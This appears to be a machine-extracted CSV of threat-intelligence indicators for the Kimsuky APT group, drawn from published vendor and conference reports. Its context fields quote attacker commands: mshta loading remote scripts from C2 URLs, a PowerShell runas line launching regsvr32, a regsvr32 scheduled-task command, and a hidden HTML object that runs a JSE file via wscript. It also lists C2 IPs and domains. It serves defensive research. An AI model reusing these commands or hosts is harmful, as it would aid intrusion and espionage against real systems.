1.0.0,actor--kimsuky,artifact--sha256:f03fe1f38a90eacabe6c42295a87db4bddc45983a273fc601a056d5ef749bfc8,observation--sha256:4c0b6c86bbbfde5d30e20fc8bba2aeba9164cf3874afa9c851ed35a8238f7833,command,"○악성매크로는HEX값을통해난독화되어있으며, Powershell 코드와파일저장경로및레지스트리경로등에서CHM공격과의유사성을보이고있습니다.","○악성매크로는HEX값을통해난독화되어있으며, Powershell 코드와파일저장경로및레지스트리경로등에서CHM공격과의유사성을보이고있습니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 47}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○악성매크로는HEX값을통해난독화되어있으며, Powershell 코드와파일저장경로및레지스트리경로등에서CHM공격과의유사성을보이고있습니다. [그림4-22] 악성매크로코드 ○분석시점에C2서버에접속이불가하여최종다운로드되는“smss.exe” 파일은확보하지못했지만RAT또는Backdoor 유형의악성코드로추정하고있습니다. Genians SecurityCenter 46",
1.0.0,actor--kimsuky,artifact--sha256:cdc25205baa0baaae18a7b9d4139c20ad8ee85b42ba4c8137d941f83fef13305,observation--sha256:48e7052dafa6a42446738b440ffa9b79cebc53c3ab3374db5a1af7ba6ebe2ce0,command,"○해당JSE 파일은지속성을유지하기위해JSE 파일을레지스트리자동실행경로에등록합니다. 이후, Powershell 을 통해 공격자의 C2 서버에서 “alg.exe” 파일을다운로드후실행합니다.","○해당JSE 파일은지속성을유지하기위해JSE 파일을레지스트리자동실행경로에등록합니다. 이후, Powershell 을 통해 공격자의 C2 서버에서 “alg.exe” 파일을다운로드후실행합니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 51}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○해당JSE 파일은지속성을유지하기위해JSE 파일을레지스트리자동실행경로에등록합니다. 이후, Powershell 을 통해 공격자의 C2 서버에서 “alg.exe” 파일을다운로드후실행합니다. [그림4-27] JSE3유형의코드 [그림4-28] GenianEDR 을통한JSE3유형탐지 Genians SecurityCenter 50",
1.0.0,actor--kimsuky,artifact--sha256:714a5c440f0b1ec23cb11ae8b33485a5ad8a80ab01f73ae27b2fc336133cf643,observation--sha256:670a7e5cb4c102ba668624992fe22a66ff11da0fea43a099b5e664e1c73e77b2,command,○해당유형은윈도우정상프로그램인“mshta.exe” 를통해공격자C2서버에서악성페이로드를다운로드하고실행하는과정을가지고있습니다.,○해당유형은윈도우정상프로그램인“mshta.exe” 를통해공격자C2서버에서악성페이로드를다운로드하고실행하는과정을가지고있습니다,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 53}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport ○해당유형은윈도우정상프로그램인“mshta.exe” 를통해공격자C2서버에서악성페이로드를다운로드하고실행하는과정을가지고있습니다. [그림4-30] MSHTA유형의HTML코드 [그림4-31] GenianEDR 을통한MSHTA유형탐지 Genians SecurityCenter 52,
1.0.0,actor--kimsuky,artifact--sha256:a4f83497695e99b8c74713ebf506f37d283eeb45b5e26121e15426d400a95200,observation--sha256:2a4c4603ebe9e10955de2575ef8b867f47a3614c3a2db30e23fd2cef4c9743e0,command,同时还会通过系统组件 mshta.exe 加载执行远程脚本。,同时还会通过系统组件 mshta.exe 加载执行远程脚本。,candidate,2021-03-16T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[3].伪装“KISA Mobile Security”APP 的启动界面 三、样本分析 3.1 “韩国国防部招标文件” 文 件 名 称 1. 2021 년 사업 계획 (시설본부 자료 참고 보완) - 210316-1 (1. 2021 年经营计划（参考设施总部补充）- 210316-1) SHA25 6 6184acd90c735783aafd32c3346c94332fa8c0212ec128a61f2 764bd224c2535 编 译 时 间 2021/03/16 23:51:07 样本所使用字符串均以加密形式存储，执行后，首先创建互斥体防止重复运行，互斥体 名称""windows update {2021-1020-02-03-A}""。 图[4].在 Dropper 中创建互斥体 接着在当前执行目录释放并执行诱饵文档并模拟打开，文档截图如图[1]所示，其大致 内容为韩国军方相关部门工程、材料等招标文件。 同时还会通过系统组件 mshta.exe 加载执行远程脚本。 URL：http",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ee6745d1473d35314ed228abdf762552b2555ea038787b0cffbacc51454d0d0f,observation--sha256:fa5f199c627fd0eda8502b99cfb4f208728f41292049d965b53e720637aacfd5,command,命令和脚本解释器：PowerShell,命令和脚本解释器：PowerShell,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 MITRE ATT&CK® Techniques - for Enterprise 策略 ID 技术名称 侦察 T1598 信息网络钓鱼 资源开发 T1583.001 T1583.004 T1587.001 获取基础设施：域 获取基础设施：服务器 开发功能：恶意软件 初始访问 T1566.001 鱼叉式附件 执行 T1059.001 T1059.003 T1059.007 T1204.002 命令和脚本解释器：PowerShell 命令和脚本解释器：Cmd 命令 命令和脚本解释器：JavaScript/Jscript 用户执行：恶意文档 持久化 T1547.001 引导或登录自动启动：注册表启动项 特权升级 T1134 访问令牌操作 防御逃避 T1134 T1140 T1027.001 T1202 T1218.005 T1218.010 访问令牌操作 解码文件或信息 混淆的文件或信息：二进制填充 间接命令执行 已签名的二进制代理执行：Mshta 已签名的二进制代理执行：Regsvr32 凭证访问,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a0e1891d07084bb1b63a6391af25ee9a3740b10f81939e4e599663df40b78e3a,observation--sha256:e39f69b9be559d94f599f909e9a1e6861c618527b9d13fbf009e0cce44c66fec,command,图[5].使用 mshta 从服务器下载远程脚本,图[5].使用 mshta 从服务器下载远程脚本,candidate,2021-03-16T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[3].伪装“KISA Mobile Security”APP 的启动界面 三、样本分析 3.1 “韩国国防部招标文件” 文 件 名 称 1. 2021 년 사업 계획 (시설본부 자료 참고 보완) - 210316-1 (1. 2021 年经营计划（参考设施总部补充）- 210316-1) SHA25 6 6184acd90c735783aafd32c3346c94332fa8c0212ec128a61f2 764bd224c2535 编 译 时 间 2021/03/16 23:51:07 样本所使用字符串均以加密形式存储，执行后，首先创建互斥体防止重复运行，互斥体 名称""windows update {2021-1020-02-03-A}""。 图[4].在 Dropper 中创建互斥体 接着在当前执行目录释放并执行诱饵文档并模拟打开，文档截图如图[1]所示，其大致 内容为韩国军方相关部门工程、材料等招标文件。 同时还会通过系统组件 mshta.exe 加载执行远程脚本。 URL：http",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c1828b3a45c29dc6a1e1f184be2a4b5ac9752f6f94ab19efc3f75fe17d375acc,observation--sha256:d991e30a63f82aa9c8997417e887bdd3f76e84e3a4072a590b04be3e338d269a,command,图[8].利用 mshta 从服务器下载脚本,图[8].利用 mshta 从服务器下载脚本,candidate,2021-05-21T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[6].用于自删除的 bat 文件 3.2 “韩美峰会参考资料” 文件名称 한미 정상회담(5.21) 참고 자료 (수정본) (韩美峰会参考资料（5 月 21 日）（修订版）) SHA256 679a17688cde5d57c4662df12ab134f64931497b87dfffd1cd87fd38ca2feef f 编译时间 2021/05/21 00:12:04 在捆绑“韩美峰会参考资料”相关诱饵文档的木马中，攻击者使用了类似的组件，但使 用 VMP 加壳保护。 图[7].木马 PE 区段中的 vmp 节表 诱饵文档如图[1]所示，引用了近期“韩美首脑会谈”的热点话题，木马执行流程与上 面样本基本一致，调用 mshta.exe 从服务器拉取下阶段脚本执行，二者 IP 解析均指向同一 服务器：104.128.239.70。 URL：http://mail.kumb.cf/?query=5 图[8].利用 mshta 从服务器下载脚本 3.3 间谍模块-Windows 研究人员分析发现，,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0fa142563fa12066f8c6e191acb03fea38f91671287a00011ea275cdd1151e3e,observation--sha256:d01ba3157c0e18b130f0cdf719691f107e028a595a097b59408d311707413473,command,已签名的二进制代理执行：Mshta,已签名的二进制代理执行：Mshta,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 MITRE ATT&CK® Techniques - for Enterprise 策略 ID 技术名称 侦察 T1598 信息网络钓鱼 资源开发 T1583.001 T1583.004 T1587.001 获取基础设施：域 获取基础设施：服务器 开发功能：恶意软件 初始访问 T1566.001 鱼叉式附件 执行 T1059.001 T1059.003 T1059.007 T1204.002 命令和脚本解释器：PowerShell 命令和脚本解释器：Cmd 命令 命令和脚本解释器：JavaScript/Jscript 用户执行：恶意文档 持久化 T1547.001 引导或登录自动启动：注册表启动项 特权升级 T1134 访问令牌操作 防御逃避 T1134 T1140 T1027.001 T1202 T1218.005 T1218.010 访问令牌操作 解码文件或信息 混淆的文件或信息：二进制填充 间接命令执行 已签名的二进制代理执行：Mshta 已签名的二进制代理执行：Regsvr32 凭证访问,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:502e0db08241f7d140f3f6a2e4a4b001a45815e8ededa6cecc88d902fed20b4a,observation--sha256:74940efd0a8530f5d333aa9aebd24130092fdd25e27454f7b9b20c3fc83de0f1,command,已签名的二进制代理执行：Regsvr32,已签名的二进制代理执行：Regsvr32,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 MITRE ATT&CK® Techniques - for Enterprise 策略 ID 技术名称 侦察 T1598 信息网络钓鱼 资源开发 T1583.001 T1583.004 T1587.001 获取基础设施：域 获取基础设施：服务器 开发功能：恶意软件 初始访问 T1566.001 鱼叉式附件 执行 T1059.001 T1059.003 T1059.007 T1204.002 命令和脚本解释器：PowerShell 命令和脚本解释器：Cmd 命令 命令和脚本解释器：JavaScript/Jscript 用户执行：恶意文档 持久化 T1547.001 引导或登录自动启动：注册表启动项 特权升级 T1134 访问令牌操作 防御逃避 T1134 T1140 T1027.001 T1202 T1218.005 T1218.010 访问令牌操作 解码文件或信息 混淆的文件或信息：二进制填充 间接命令执行 已签名的二进制代理执行：Mshta 已签名的二进制代理执行：Regsvr32 凭证访问,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8e3466d75efd8890d6d375789fbea43ab800d7d2d4ee6b22933990c990218ffd,observation--sha256:62924a21756c1725085ac76d16f9fb4afa5f6a34ca99176ebdeecd13d493b585,command,来确定 UAC 是否关闭，以及是否为管理员模式，如果否的话将会调用 powershell 提权运行。,来确定 UAC 是否关闭，以及是否为管理员模式，如果否的话将会调用 powershell 提权运行。,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[11].RAT 模块中设置注册表开机启动项 接着以“SpyRegsvr32-20210507140631”为名创建互斥体，此种类型互斥体在 Kims uky 之前的攻击活动中多次出现，其中有“Spy”关键字和编译时间信息“20210507”。 图[12].RAT 模块中创建互斥体 通过检查 UAC 注册表项 ConsentPromptBehaviorAdmin 和 PromptOnSecureDesktop 来确定 UAC 是否关闭，以及是否为管理员模式，如果否的话将会调用 powershell 提权运行。 powershell.exe start-process regsvr32.exe -argumentlist '/s [木马路径]' -verb runas 木马使用两层命令结构与 C2 服务器通信，使用的 C2 服务器为：anto.shore.ml。 ?m={指令 1}&p1={硬盘序列号}&p2={指令 2} 该模块可支持多种间谍类型的远控功能，包括远程 Shell、文件上传/下载,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d771b13f554126285dc26901bfa23065f2c1a7ef3ce7930b5dfecc94a6163d02,observation--sha256:aa656a6c4141f1af97326801408d8ee7c916dd4c712d8a24cdd8b3b0f1e082fb,command,通过 regsvr32.exe 启动该 RAT，并调用恶意流程入口点 DllRegisterServer。,通过 regsvr32.exe 启动该 RAT，并调用恶意流程入口点 DllRegisterServer。,candidate,2021-05-07T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 源 RAT 样本发现，该样本使用的 C2 服务器与上述服务器被解析为同一个 IP 地址（104.1 28.239.70）。 MD5 c861f25bb943f77a909b33d62bb71926 SHA1 576b953cb4fe71adb71a338a42524b0e424824c1 SHA256 fd59597169668b90c47d0ad6db1bcd7d778c6d54ee3c42bdd2d86b2d2d34 c885 文件大小 485888 字节 (474.50 KB) 文件格式 PE64 DLL 编译时间 2021/05/07 05:06:47 C&C anto.shore.ml 通过 regsvr32.exe 启动该 RAT，并调用恶意流程入口点 DllRegisterServer。 图[9].RAT 模块的导出表 执行后首先进行安装流程，自我复制到以下目录： C:\\ProgramData\\Software\\Microsoft\\Windows\\MDF\\WDFSync,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:44cc987e2d3adba901b50a4db10230965e3fa79fc90b6cce35e1b05c8a2438bc,observation--sha256:0fb9616027b3fc168098af7c3cb2fbab997f15a2343fc3af37fc849da97e7436,command,面样本基本一致，调用 mshta.exe 从服务器拉取下阶段脚本执行，二者 IP 解析均指向同一,面样本基本一致，调用 mshta.exe 从服务器拉取下阶段脚本执行，二者 IP 解析均指向同一,candidate,2021-05-21T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[6].用于自删除的 bat 文件 3.2 “韩美峰会参考资料” 文件名称 한미 정상회담(5.21) 참고 자료 (수정본) (韩美峰会参考资料（5 月 21 日）（修订版）) SHA256 679a17688cde5d57c4662df12ab134f64931497b87dfffd1cd87fd38ca2feef f 编译时间 2021/05/21 00:12:04 在捆绑“韩美峰会参考资料”相关诱饵文档的木马中，攻击者使用了类似的组件，但使 用 VMP 加壳保护。 图[7].木马 PE 区段中的 vmp 节表 诱饵文档如图[1]所示，引用了近期“韩美首脑会谈”的热点话题，木马执行流程与上 面样本基本一致，调用 mshta.exe 从服务器拉取下阶段脚本执行，二者 IP 解析均指向同一 服务器：104.128.239.70。 URL：http://mail.kumb.cf/?query=5 图[8].利用 mshta 从服务器下载脚本 3.3 间谍模块-Windows 研究人员分析发现，,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0b9d230f03f1c39b96dc24f1dc8d32335df3ab747dcb94aa20e5d486780a6fab,observation--sha256:47f079cd7fe6351b3cbb94883812e009c5e732e4fae786c1641df3671226bdee,command,[표4-4] Powershell 코드유사도,표4-4] Powershell 코드유사도,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 56}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport </SCRIPT> inner;A.Click(); inner ='<OBJECTid=""B""classid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" style=""visibility:hidden"">';inner +='<PARAMname=""Command""value=""ShortCut""><PARAMname=""Button""value=""Bitmap:shortcut"">';inner +='<PARAMname=""Item1""value="",wscript,C:\\Users\\Public\\Libraries\\Docs.jseP""><PARAMname=""Item2""value=""273,1,1""></OBJECT>';document.getElementById('par').innerHTML=inner;B.Click(); </script> [표4-3] HTML코드유사도 4.10. Powershell 코드유사도 ○VBS 와JSE 유형모두Pow",
1.0.0,actor--kimsuky,artifact--sha256:31e7eb0617c8d06abde78eb4f67a3dc396a810a63f3db31eeb9b46d34067792a,observation--sha256:61b5dae21186ad54fb3176a605800b1bd9baf205d814c6d98c7970a5477df245,file-name,-o1.elf,-o1.elf,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:37d4504befe32b59394a24a5c3c64f8effb57567ae4f1f0743f6351ab35de283,observation--sha256:6736a687676d9f2bce37dc5f4af55e832c1a1a6207a3f971c1e767eb7efd3517,file-name,05.exe,05.exe,candidate,2023-04-08T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 52}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22:01:12 is. This means that the domestic transit point (KR) where this vulnerability exists was hacked through a system hacked by the Kimsuky organization. Since it can be difficult to specify , if ""(Table 4) RDP (CVE-2019-0708) Vulnerability Scanner List"" and ""(Table 5) Public Program List"" are found together during a breach investigation, you can suspect that it is a Kimsuky organization. 22:00:45 HackTool/Win.RdpScan.R437610 KPortScan3.exe, shown in light yellow, will also be released in C2 ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a6ef23e29888e2282f0af23974b0d5f96e7a10d53b382b8c6dc5ebf84de9e5b0,observation--sha256:8b2cecc054a70519cc48b233966f6e80236d7c519119d55ea57dc3a72f624f78,file-name,0v2.47.zip,0v2.47.zip,candidate,2022-04-12T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 67}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"_x64.rar AhnLab disclosed the analysis information on the ASEC blog around the time of work on Friday, April 29, 2022. Before that, the Kimsuky organization hacked namastte and used 6*.3*.5*.20 to access the uploaded web shell. *(KR), a total of 2 IPs including 118.128.149.119(KR) were used for malware testing. 6*.3*.5*.20*(KR) hxxp://www.namastte.kr/sources/Util/AJAX.php?fpath=/home/nam astte/html/ sources/Util/temp/mmtool&fopen=RdpScan_La05_122 15:29:58 15:53:55 ÿ IP connected to namastte web ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ae478ae7739379419a4cc03aa3a6abf40a82da68ed6de38c8f26eae5b0f81bcc,observation--sha256:756e9ce5d6782805996ff12ab3fc7d7b645cc7d4d10182e3619e10c7e90d8bae,file-name,1.elf,1.elf,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:ae478ae7739379419a4cc03aa3a6abf40a82da68ed6de38c8f26eae5b0f81bcc,observation--sha256:bf880e59f575dba13e2e59516b61fc7c624b6a5f14d03119da319491ff862fec,file-name,1.elf,1.elf,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 16}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 16 VIRUS BULLETIN CONFERENCE OCTOBER 2021 7.2 File and directory discovery The attacker used the following shell commands to search for files and directories on the internal server:  ls, cd [DIRECTORY], vi ... etc. 8. Lateral movement 8.1 Remote services: RDP , SSH At the time of the incident response, the records of access from the internal server to other internal servers were confirmed. Some internal servers (Linux, W",
1.0.0,actor--kimsuky,artifact--sha256:99c519bfb59cffcade68406603d51c6858435d432066297bf492775b1ff8e786,observation--sha256:594789e9862fbf1de841a510441214d18b01b34195eab488fd672e68240927dc,file-name,1.exe,1.exe,candidate,2018-12-21T00:00:00Z,day,known,same-record,2019-02-01T00:00:00Z,source--babyshark-xlsx,baby-kimsuky/BabyShark Rule - Mal Cert and others.xlsx,"{""row"": 5, ""sheet"": ""check-results_Venom23-155099628""}",[],"[""malware--babyshark""]",[],"[""payload""]",0,false,high,TLP:CLEAR,xlsx-row,6f76a8e16908ba2d576cf0e8cdb70114dcb70e0f7223be10aab3a728dc65c41c malicious MAL_PE_Type_BabyShark_Loader 29 Microsoft: Trojan:Win32/Casdet!rfn / McAfee: RDN/Generic Downloader.x / TrendMicro: TROJ_GEN.R03BC0OLU18 / ESET-NOD32: Win32/TrojanDownloader.Small.BBR / Symantec: Trojan Horse / Sophos: Mal/Generic-S / GData: Trojan.GenericKD.31719547 1.exe 2018-12-21 08:30:28 UTC ( 2 months ago ) 2019-02-24 09:55:07 Win32 EXE 9f76d2f73020064374efe67dc28fa006 d96c04952ba0cb61b64bc7f08d7257913d8b7968 6f76a8,
1.0.0,actor--kimsuky,artifact--sha256:5c26f18133a2acd5af8569fa15a70f1389cd176d555930c04b6b3c1ba655a688,observation--sha256:b8e50843751358faf4838d9c6a48f079e130ab22c7195daf344d293f5ceddd8f,file-name,(1AC0.tmp,1AC0.tmp,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 20}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 20 VIRUS BULLETIN CONFERENCE OCTOBER 2021 9.3 Data encoding: non-standard encoding Windows personal PC C&C communication details, when executed, are the same as the known typical AppleSeed communication method.  [C&C]: http://104.128.239.128/?m=[]&p1=[]&p2=[]  Send infected computer information to C&C and wait for additional file download. When contents such as keylogging and screenshots were uploaded to the C&C server,",
1.0.0,actor--kimsuky,artifact--sha256:3fa26d316a9e59c7b4be1c3adce8ac6566c1a801ac8dfdc30760000db48408f7,observation--sha256:042173c1931891e2eeec2895dc327c4dd714bf19a3065acd941a48db6aa4bd8e,file-name,1AC0.tmp.enc,1AC0.tmp.enc,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 20}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 20 VIRUS BULLETIN CONFERENCE OCTOBER 2021 9.3 Data encoding: non-standard encoding Windows personal PC C&C communication details, when executed, are the same as the known typical AppleSeed communication method.  [C&C]: http://104.128.239.128/?m=[]&p1=[]&p2=[]  Send infected computer information to C&C and wait for additional file download. When contents such as keylogging and screenshots were uploaded to the C&C server,",
1.0.0,actor--kimsuky,artifact--sha256:f22ee4e0b832c0304eef584a2dd0c8f7cc39b8bd28276a9025644f7532e092b5,observation--sha256:85c0ef9e3b02b8cb08f4d5f31b4b0d9c61338e24ba4891af9a76c208209acf6f,file-name,2.elf,2.elf,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:f22ee4e0b832c0304eef584a2dd0c8f7cc39b8bd28276a9025644f7532e092b5,observation--sha256:f70b6693e23ce145b769551fe45fe5142e3626bb8f01721a6079a5d70c4c1bbf,file-name,2.elf,2.elf,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 16}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 16 VIRUS BULLETIN CONFERENCE OCTOBER 2021 7.2 File and directory discovery The attacker used the following shell commands to search for files and directories on the internal server:  ls, cd [DIRECTORY], vi ... etc. 8. Lateral movement 8.1 Remote services: RDP , SSH At the time of the incident response, the records of access from the internal server to other internal servers were confirmed. Some internal servers (Linux, W",
1.0.0,actor--kimsuky,artifact--sha256:cf89b02a1276fce15dbf425a554e33d871308932364ab0251edd2478b69fbb56,observation--sha256:fa02a67b496fde78c1198be23321a7f2db2ff73029edce8b335fadaef8fef95a,file-name,2.rar,2.rar,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 296}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,111/2.rar (more below).,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c55bafba1e3d234075a078bd8c5896d7da2243ead093a2858428fc8be63dc00d,observation--sha256:d69dec6740f90fdffec1bb05c7213c45605ce8cfd1ffcc00f36d75511a86b8b8,file-name,20.pdf,20.pdf,candidate,2021-06-01T00:00:00Z,month,known,same-record,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 27}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 27VIRUS BULLETIN CONFERENCE OCTOBER 2021 [7] Kuo, J.-L.; Liao, Z.-C. “We are about to land.”: How CloudDragon Turns a Nightmare into Reality. Black Hat 